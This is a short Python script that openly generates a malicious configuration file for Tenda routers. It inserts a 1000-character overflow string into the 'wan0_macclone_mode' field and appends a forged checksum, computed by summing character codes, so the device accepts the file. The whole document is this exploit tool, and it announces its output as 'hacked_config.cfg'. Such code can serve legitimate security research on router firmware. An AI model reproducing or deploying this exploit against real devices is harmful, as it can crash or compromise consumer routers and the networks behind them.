import struct

def calculate_tenda_crc(payload_data):

    crc_sum = 0
    for char in payload_data:
        if char not in ['\r', '\n']:
            crc_sum += ord(char)
    return crc_sum

def generate_malicious_cfg():
    config = "sys_workmode=router\r\n"
    config += "wan0_primary=1\r\n"
    config += "wan_domain=www.tendawifi.com\r\n"
    junk = "A" * 1000
    config += f"wan0_macclone_mode={junk}\r\n"
    fake_crc = calculate_tenda_crc(config)
    final_payload = config + f"@{fake_crc}"
    
    with open("hacked_config.cfg", "w") as f:
        f.write(final_payload)
        
    print(f"[+] Malicious config V2 generated: hacked_config.cfg")
    print(f"[+] Fake CRC Signature: @{fake_crc}")

if __name__ == "__main__":
    generate_malicious_cfg()
